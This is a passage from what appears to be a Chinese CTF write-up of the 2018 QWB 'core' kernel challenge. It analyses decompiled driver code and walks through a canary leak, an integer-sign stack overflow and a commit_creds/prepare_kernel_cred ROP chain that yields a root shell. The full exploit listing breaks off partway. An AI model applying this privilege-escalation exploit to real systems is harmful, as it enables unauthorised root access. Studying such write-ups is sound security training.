class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /proc/modules</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /proc/devices</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /proc/kallsyms</span><br><span class=\"line\"></span><br><span class=\"line\">lsmod</span><br><span class=\"line\"></span><br><span class=\"line\">dmesg</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/ <span class=\"comment\"># lsmod</span></span><br><span class=\"line\">core 16384 0 - Live 0xffffffffc02aa000 (O)</span><br></pre></td></tr></table></figure>\n<h2 id=\"题目分析\"><a class=\"markdownIt-Anchor\" href=\"#题目分析\">#</a> 题目分析</h2>\n<p>core.ko 就是我们需要利用的漏洞驱动</p>\n<h3 id=\"core_ioctl\"><a class=\"markdownIt-Anchor\" href=\"#core_ioctl\">#</a> #core_ioctl</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">core_ioctl</span><span class=\"params\">(__int64 fd, <span class=\"type\">int</span> idx, __int64 user_buf)</span><span class=\"comment\">//fd是设备对应的文件描述符</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> ( idx )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0x6677889B</span>:</span><br><span class=\"line\">      core_read(user_buf);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0x6677889C</span>:</span><br><span class=\"line\">      printk(&amp;unk_2CD);</span><br><span class=\"line\">      off = user_buf;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0x6677889A</span>:</span><br><span class=\"line\">      printk(&amp;unk_2B3);</span><br><span class=\"line\">      core_copy_func(user_buf);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据我们的传参实现三种功能， case 0x6677889C: 实现我们控制 off 全局变量</p>\n<h3 id=\"core_read\"><a class=\"markdownIt-Anchor\" href=\"#core_read\">#</a> core_read</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">core_read</span><span class=\"params\">(__int64 a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *v2; <span class=\"comment\">// rdi</span></span><br><span class=\"line\">  __int64 i; <span class=\"comment\">// rcx</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">64</span>]; <span class=\"comment\">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 canary; <span class=\"comment\">// [rsp+40h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  canary = __readgsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  printk(&amp;unk_25B);</span><br><span class=\"line\">  printk(&amp;unk_275);</span><br><span class=\"line\">  v2 = buf;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">16LL</span>; i; --i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_DWORD *)v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v2 += <span class=\"number\">4</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(buf, <span class=\"string\">&quot;Welcome to the QWB CTF challenge.\\n&quot;</span>);</span><br><span class=\"line\">  result = copy_to_user(a1, &amp;buf[off], <span class=\"number\">64LL</span>);   <span class=\"comment\">// 栈任意地址读</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !result )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __readgsqword(<span class=\"number\">0x28</span>u) ^ canary;</span><br><span class=\"line\">  __asm &#123; swapgs &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>控制 off 后，我们就可一计算 buf 与 canary 的编译，然后通过 copy_to_user 将 canary 泄露出来。</p>\n<h3 id=\"core_copy_func\"><a class=\"markdownIt-Anchor\" href=\"#core_copy_func\">#</a> core_copy_func</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">core_copy_func</span><span class=\"params\">(__int64 size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  _QWORD v2[<span class=\"number\">10</span>]; <span class=\"comment\">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2[<span class=\"number\">8</span>] = __readgsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  printk(&amp;unk_215);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">63</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printk(&amp;unk_2A1);</span><br><span class=\"line\">    result = <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    qmemcpy(v2, &amp;name, (<span class=\"type\">unsigned</span> __int16)size);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>传入负数就可以绕过检查，然后实现对 v2 的溢出。</p>\n<h3 id=\"core_write\"><a class=\"markdownIt-Anchor\" href=\"#core_write\">#</a> core_write</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">core_write</span><span class=\"params\">(__int64 a1, __int64 _buf, <span class=\"type\">unsigned</span> __int64 size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  printk(&amp;unk_215);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a3 &lt;= <span class=\"number\">0x800</span> &amp;&amp; !copy_from_user(&amp;name, _buf, size) )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)size;</span><br><span class=\"line\">  printk(&amp;unk_230);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">4294967282LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>将数据写入内核全局变量 name 中。</p>\n<p>1、通过 /tmp/kallsyms 文件获得 commit_creds 函数与 prepare_kernel_cred 函数地址，并计算出所需 gadget 地址。2、对全局变量 off 赋值 0x40，通过 core_read 函数获得 canary 的值。3、构建好 ropchain，使用 core_write 函数将 ropchain 复制到内核态中 4、通过 core_copy_func 函数中的数值溢出造成的栈溢出漏洞，将 ropchain 放入栈中，退出函数时完成提权并返回用户态 getrootshell。</p>\n<h2 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<p>kernel rop 相较于用户态 rop 的不同点吧。在用户态中我们的目的是为了获得 shell，也就是令程序执行诸如 system (&quot;/bin/sh&quot;) 一类的函数，然而到了 kernel pwn 中我们的目的从原先的 getshell 变成了提权，也就是执行 commit_creds (prepare_kernel_cred (0)) 函数，并且执行完提权函数以后我们需要从内核态返回到用户态执行 system (&quot;/bin/sh&quot;) 获取 root 权限的 shell 才可以，所以在我看来 kernel rop 变得无非就是两步：执行提权函数，返回用户态获取 rootshell。从内核态返回用户态所需要用到的 swapgs 指令与 iretq 指令，前者是在从用户态进入内核态时，通过交换 IA32_KERNEL_GS_BASE 与 IA32_GS_BASE 值，从而得到 kernel 数据结构块，而从内核态变回用户态时需要将原先用户态的信息再交换回来。iretq 指令则用来恢复用户态的 cs、ss、rsp、rip、rflags 的信息。其具体布局如下所示：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+-----------+\t\t\t-----lower</span><br><span class=\"line\">|    RIP    |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">|    CS     |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">|   rflags  |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">|    RSP    |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">|    SS     |\t\t\t-----higher</span><br><span class=\"line\">+-----------+</span><br></pre></td></tr></table></figure>\n<p>在计算内核 gadget 地址的时候我们使用 ropper 得到的 gadget 地址需要加上 offset 才是真实地址，这个和用户态的一样很好理解，而这个 offset 的获取办法，因为程序将函数地址导入到了 /tmp/kallsyms 中，我们我们可以 cat 出函数的真实地址，然后减去函数的 textoffset，就得到了 vmlinux_base. 而刚才所说的 offset 就是 vmlinux_base 减去 raw_vmlinux_base，即 0xffffffff81000000 的值。这题我们可以直接获取 start_up64</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/kernel/<span class=\"number\">2018</span>qwb_core/give_to_player$ checksec vmlinux</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/kernel/2018qwb_core/give_to_player/vmlinux&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    Version:  <span class=\"number\">4.15</span><span class=\"number\">.8</span></span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No <span class=\"title function_\">PIE</span> <span class=\"params\">(<span class=\"number\">0xffffffff81000000</span>)</span></span><br><span class=\"line\">    RWX:      Has RWX segments</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"获取vmlinux_base\"><a class=\"markdownIt-Anchor\" href=\"#获取vmlinux_base\">#</a> 获取 vmlinux_base</h3>\n<p>打开 /tmp/kallsyms，获得 commit_creds 函数与 prepare_kernel_cred 函数地址，并计算出 gadget 的地址。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">GetAddress</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> <span class=\"type\">char</span> *ptr;\t\t\t\t\t\t\t\t\t<span class=\"comment\">//stroull 的结束符号</span></span><br><span class=\"line\"> <span class=\"type\">char</span> buf[<span class=\"number\">0x30</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"> FILE* fd = fopen(<span class=\"string\">&quot;/tmp/kallsyms&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);\t\t\t<span class=\"comment\">//打开文件</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!fd) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] ERROR.&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">while</span>(fgets(buf, <span class=\"keyword\">sizeof</span>(buf), fd)) &#123;\t\t\t<span class=\"comment\">//文件数据会进入缓存，然后再呗拷贝到buf，所以，buf会更新。</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] Find: commit_creds: 0x%llx\\n[+] Find: prepare_kernel_cred: 0x%llx\\n&quot;</span>, commit_creds, prepare_kernel_cred);</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(buf, <span class=\"string\">&quot;commit_creds&quot;</span>)) &#123;\t\t\t<span class=\"comment\">//string.h库的字符串比较函数，返回字串的位置指针</span></span><br><span class=\"line\">   commit_creds = strtoull(buf, ptr, <span class=\"number\">16</span>);\t\t<span class=\"comment\">//找到了地址，将地址转为unsigned long long </span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(buf, <span class=\"string\">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class=\"line\">   prepare_kernel_cred = strtoull(buf, ptr, <span class=\"number\">16</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*实例</span></span><br><span class=\"line\"><span class=\"comment\">/ # cat /tmp/kallsyms | grep commit_creds</span></span><br><span class=\"line\"><span class=\"comment\">ffffffffba29c8e0 T commit_creds</span></span><br><span class=\"line\"><span class=\"comment\">/ # </span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n<p>#返回用户态的准备，我们最终要返回用户太执行 system (’/bin/sh’)，从你内核太返回的时候，iretq 会恢复某些寄存器的值。所以我们需要提前保存这些值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">SaveStatus</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> __asm__(</span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_cs, cs;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_ss, ss;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_sp, rsp;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;pushf;&quot;</span>\t\t\t\t\t\t<span class=\"comment\">//所有的16位标志寄存器入栈</span></span><br><span class=\"line\">  <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\"> );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里才用汇编内联，将数据保存到全局变量中 user_cs， user_ss, user_sp,</p>\n<p>core.ko 一个外设，但是再 linux 中，万物皆文件，所以只需要访问 /proc/core。</p>\n<p>但是如何实现用户访问与内核的转换的呢？ioctl 函数提供响应的接口。设备对应的是 core_ioctl 函数。</p>\n<p>首先我们要泄露 canary，通过分析，我们得知，buf 与 canary 的偏移量是 0x40，core_read 函数会把 buf 拷贝到我们的 user_buf 中。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ioctl(fd, CORE_OFF, <span class=\"number\">0x40</span>);\t\t\t<span class=\"comment\">//read canary to buf on kernel stack</span></span><br><span class=\"line\"> ioctl(fd, <span class=\"number\">0x6677889B</span>, user_buf); <span class=\"comment\">//canary in buf.copy it to user_buf that we can control.</span></span><br></pre></td></tr></table></figure>\n<p>下面我们就要构造 rop, 首先填充 v2 的八字节以及 canary，然后就是布置 gadget。说明一点，commit_creds (prepare_kernel_cred (0)）是在内核态执行的，只有在返回用户态的时候（也就是我们执行完了提权，才需要布置额外的寄存器的数据）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> i=<span class=\"number\">8</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> rop[<span class=\"number\">0x100</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">rop[i++] = canary;</span><br><span class=\"line\">rop[i++] = <span class=\"number\">0</span>;\t\t\t\t\t<span class=\"comment\">//覆盖rbp</span></span><br><span class=\"line\">rop[i++] = pop_rdi;\t\t\t<span class=\"comment\">//rip </span></span><br><span class=\"line\">rop[i++] = <span class=\"number\">0</span>;\t\t\t\t\t<span class=\"comment\">//rdi=0</span></span><br><span class=\"line\">rop[i++] = prepare_kernel_cred;\t<span class=\"comment\">//执行prepare_kernel_cred</span></span><br><span class=\"line\">rop[i++] = pop_rdx;\t\t\t\t</span><br><span class=\"line\">rop[i++] = commit_creds;</span><br><span class=\"line\">rop[i++] = mov_rdi_rax;\t\t\t<span class=\"comment\">//将prepare_kernel_cred的返回值作为commit_creds的参数。mov_rdi_rax,jmp rdx.</span></span><br><span class=\"line\"><span class=\"comment\">//swapgs --&gt; iretq: rip, cs, rflags, rsp, ss. GetShell</span></span><br><span class=\"line\">rop[i++] = swapgs;\t\t\t\t\t<span class=\"comment\">//gadget 是swapgs ;popfq;ret,</span></span><br><span class=\"line\">rop[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">rop[i++] = iretq;\t\t\t\t\t</span><br><span class=\"line\">rop[i++] = (<span class=\"type\">size_t</span>)GetShell;</span><br><span class=\"line\">rop[i++] = user_cs;</span><br><span class=\"line\">rop[i++] = user_rflags;</span><br><span class=\"line\">rop[i++] = user_sp;</span><br><span class=\"line\">rop[i++] = user_ss;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"完整的exp\"><a class=\"markdownIt-Anchor\" href=\"#完整的exp\">#</a> 完整的 exp</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CORE_READ 0x6677889B</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CORE_OFF 0x6677889C</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CORE_COPY 0x6677889A</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">size_t</span> vmlinux_base, commit_creds, prepare_kernel_cred;</span><br><span class=\"line\"><span class=\"type\">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class=\"line\"><span class=\"type\">size_t</span> raw_vmlinux_base = <span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">GetAddress</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> <span class=\"type\">char</span> *ptr;</span><br><span class=\"line\"> <span class=\"type\">char</span> buf[<span class=\"number\">0x30</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"> FILE* fd = fopen(<span class=\"string\">&quot;/tmp/kallsyms&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!fd) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] ERROR.&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">while</span>(fgets(buf, <span class=\"keyword\">sizeof</span>(buf), fd)) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] Find: commit_creds: 0x%llx\\n[+] Find: prepare_kernel_cred: 0x%llx\\n&quot;</span>, commit_creds, prepare_kernel_cred);</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(buf, <span class=\"string\">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class=\"line\">   commit_creds = strtoull(buf, ptr, <span class=\"number\">16</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(buf, <span class=\"string\">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class=\"line\">   prepare_kernel_cred = strtoull(buf, ptr, <span class=\"number\">16</span>);</span><br><span class=\"line\">  